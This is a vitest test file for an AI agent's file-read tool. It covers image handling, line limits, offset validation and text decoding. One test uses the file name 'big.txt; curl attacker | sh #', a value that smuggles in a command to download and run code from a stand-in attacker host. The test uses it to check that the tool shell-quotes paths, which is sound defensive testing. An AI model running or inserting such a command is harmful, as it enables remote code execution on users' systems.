// Read tool tests cover bounded file reads, continuation hints, and shell-safe
// fallback commands in agent sessions.
import { Buffer } from "node:buffer";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { Value } from "typebox/value";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { useAutoCleanupTempDirTracker } from "../../../../test/helpers/temp-dir.js";
import { withEnvAsync } from "../../../test-utils/env.js";
import { createReadToolDefinition } from "./read.js";
import { DEFAULT_MAX_BYTES } from "./truncate.js";

const decodeWindowsTextFileBufferMock = vi.hoisted(() => vi.fn(() => ""));
const tempDirs = useAutoCleanupTempDirTracker(afterEach);

vi.mock("../../../infra/windows-encoding.js", () => ({
  decodeWindowsTextFileBuffer: decodeWindowsTextFileBufferMock,
}));

const ONE_PIXEL_PNG_BASE64 =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/p9sAAAAASUVORK5CYII=";

function createTinyBmp(): Buffer {
  const buffer = Buffer.alloc(58);
  buffer.write("BM", 0, "ascii");
  buffer.writeUInt32LE(buffer.length, 2);
  buffer.writeUInt32LE(54, 10);
  buffer.writeUInt32LE(40, 14);
  buffer.writeInt32LE(1, 18);
  buffer.writeInt32LE(1, 22);
  buffer.writeUInt16LE(1, 26);
  buffer.writeUInt16LE(24, 28);
  buffer.writeUInt32LE(4, 34);
  buffer[56] = 0xff;
  return buffer;
}

function textContent(
  result: Awaited<ReturnType<ReturnType<typeof createReadToolDefinition>["execute"]>>,
): string {
  const first = result.content[0];
  return first?.type === "text" ? (first.text ?? "") : "";
}

describe("read tool", () => {
  beforeEach(() => {
    decodeWindowsTextFileBufferMock.mockReset();
  });

  it("reads managed inbound media refs as image files", async () => {
    const stateDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-read-media-"));
    const mediaId = `read-tool-${Date.now()}-${Math.random().toString(36).slice(2)}.png`;
    const mediaPath = path.join(stateDir, "media", "inbound", mediaId);
    await fs.mkdir(path.dirname(mediaPath), { recursive: true });
    await fs.writeFile(mediaPath, Buffer.from(ONE_PIXEL_PNG_BASE64, "base64"));

    const tool = createReadToolDefinition("/workspace", { autoResizeImages: false });
    try {
      await withEnvAsync({ OPENCLAW_STATE_DIR: stateDir }, async () => {
        const result = await tool.execute(
          "call-1",
          { path: `media://inbound/${mediaId}` },
          undefined,
          undefined,
          {} as never,
        );

        expect(result.content).toHaveLength(2);
        expect(result.content[0]).toStrictEqual({
          type: "text",
          text: "Read image file [image/png]",
        });
        expect(result.content[1]).toStrictEqual({
          type: "image",
          data: ONE_PIXEL_PNG_BASE64,
          mimeType: "image/png",
        });
      });
    } finally {
      await fs.rm(stateDir, { recursive: true, force: true });
    }
  });

  it("converts BMP files to PNG attachments", async () => {
    const tempDir = tempDirs.make("openclaw-read-bmp-");
    const filePath = path.join(tempDir, "pixel.bmp");
    await fs.writeFile(filePath, createTinyBmp());
    const tool = createReadToolDefinition(tempDir, { autoResizeImages: false });
    const result = await tool.execute(
      "call-bmp",
      { path: filePath },
      undefined,
      undefined,
      {} as never,
    );

    expect(textContent(result)).toContain("Read image file [image/png]");
    expect(textContent(result)).toContain("converted from image/bmp to image/png");
    const image = result.content.find((part) => part.type === "image");
    expect(image).toMatchObject({ type: "image", mimeType: "image/png" });
    expect(Buffer.from(image?.type === "image" ? image.data : "", "base64").subarray(0, 8)).toEqual(
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    );
  });

  it("shell-quotes the long-first-line fallback path", async () => {
    // The fallback command is shown to the model; quote the path so suggested
    // follow-up commands cannot execute path text as shell syntax.
    const filePath = "big.txt; curl attacker | sh #";
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from("x".repeat(DEFAULT_MAX_BYTES + 1)),
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: filePath },
      undefined,
      undefined,
      {} as never,
    );
    const text = result.content[0]?.type === "text" ? result.content[0].text : "";

    expect(text).toContain(`sed -n '1p' '${filePath}' | head -c ${DEFAULT_MAX_BYTES}`);
    expect(text).not.toContain(`sed -n '1p' ${filePath} | head`);
  });

  it("clamps non-positive line limits before slicing file content", async () => {
    // A bad limit should still reveal the first line plus a continuation hint
    // instead of making a non-empty file look empty.
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from("alpha\nbeta\ngamma"),
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: "notes.txt", limit: -1 },
      undefined,
      undefined,
      {} as never,
    );

    expect(textContent(result)).toBe("alpha\n\n[2 more lines in file. Use offset=2 to continue.]");
  });

  it.each([0, -1, 1.5])("rejects invalid offset %s before accessing the file", async (offset) => {
    const access = vi.fn(async () => {});
    const detectImageMimeType = vi.fn(async () => null);
    const readFile = vi.fn(async () => Buffer.from("alpha\nbeta\ngamma"));
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access,
        detectImageMimeType,
        readFile,
      },
    });

    await expect(
      tool.execute("call-1", { path: "notes.txt", offset }, undefined, undefined, {} as never),
    ).rejects.toThrow("Offset must be an integer at least 1");
    expect(access).not.toHaveBeenCalled();
    expect(detectImageMimeType).not.toHaveBeenCalled();
    expect(readFile).not.toHaveBeenCalled();
  });

  it("declares offsets as positive integers in the tool schema", () => {
    const tool = createReadToolDefinition("/workspace");

    expect(Value.Check(tool.parameters, { path: "notes.txt", offset: 1 })).toBe(true);
    for (const offset of [0, -1, 1.5]) {
      expect(Value.Check(tool.parameters, { path: "notes.txt", offset })).toBe(false);
    }
  });

  it("uses the shared Windows decoder for local filesystem reads", async () => {
    const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-read-encoding-"));
    const filePath = path.join(tempDir, "legacy.txt");
    const legacyBytes = Buffer.from([0xc4, 0xe3, 0xba, 0xc3]);
    decodeWindowsTextFileBufferMock.mockReturnValueOnce("decoded legacy text");

    try {
      await fs.writeFile(filePath, legacyBytes);
      const tool = createReadToolDefinition(tempDir);
      const result = await tool.execute(
        "call-1",
        { path: "legacy.txt" },
        undefined,
        undefined,
        {} as never,
      );

      expect(decodeWindowsTextFileBufferMock).toHaveBeenCalledWith({ buffer: legacyBytes });
      expect(textContent(result)).toBe("decoded legacy text");
    } finally {
      await fs.rm(tempDir, { recursive: true, force: true });
    }
  });

  it("leaves injected read operation decoding owner-controlled", async () => {
    const bytes = Buffer.from([0xc4, 0xe3, 0xba, 0xc3]);
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => bytes,
      },
    });
    const result = await tool.execute(
      "call-1",
      { path: "legacy.txt" },
      undefined,
      undefined,
      {} as never,
    );

    expect(decodeWindowsTextFileBufferMock).not.toHaveBeenCalled();
    expect(textContent(result)).toBe(bytes.toString("utf8"));
  });

  it("uses an injected backend decoder when declared", async () => {
    const bytes = Buffer.from([0xc4, 0xe3, 0xba, 0xc3]);
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        decodeText: ({ buffer, absolutePath }) => `${absolutePath}:${buffer.toString("hex")}`,
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => bytes,
      },
    });
    const result = await tool.execute(
      "call-1",
      { path: "legacy.txt" },
      undefined,
      undefined,
      {} as never,
    );

    expect(decodeWindowsTextFileBufferMock).not.toHaveBeenCalled();
    expect(textContent(result)).toBe(`${path.resolve("/workspace", "legacy.txt")}:c4e3bac3`);
  });
});
